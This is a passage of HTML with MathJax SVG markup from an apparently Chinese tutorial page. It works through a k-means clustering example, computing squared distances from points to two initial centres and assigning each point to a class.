221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>，</p><script type="math/tex; mode=display">d(x_3,m_1^{(0)})=(1-0)^2+(0-2)^2=5\\d(x_3,m_2^{(0)})=(1-0)^2+(0-0)^2=1</script><p>将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.375ex" role="img" focusable="false" viewBox="0 -442 1008.6 607.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>。</p><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.67ex" height="2.47ex" role="img" focusable="false" viewBox="0 -841.7 5158.3 1091.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>，</p><script type="math/tex; mode=display">d(x_4,m_1^{(0)})=(5-0)^2+(0-2)^2=29\\d(x_4,m_2^{(0)})=(5-0)^2+(0-0)^2=25</script><p>将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.339ex" role="img" focusable="false" viewBox="0 -442 1008.6 592"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>。</p><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.67ex" height="2.47ex" role="img" focusable="false" viewBox="0 -841.7 5158.3 1091.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g></g></g></svg></mjx-container>，</p><script type="math/tex; mode=display">d(x_5,m_1^{(0)})=(5-0)^2+(2-2)^2=25\\d(x_5,m_2^{(0)})=(5-0)^2+(2-0)^2=29</script><p>将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.375ex" role="img" focusable="false" viewBox="0 -442 1008.6 607.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>。</p><p>得到新的类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="34.013ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 15033.9 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(2050.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(3106.2,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(3606.2,0)"><g 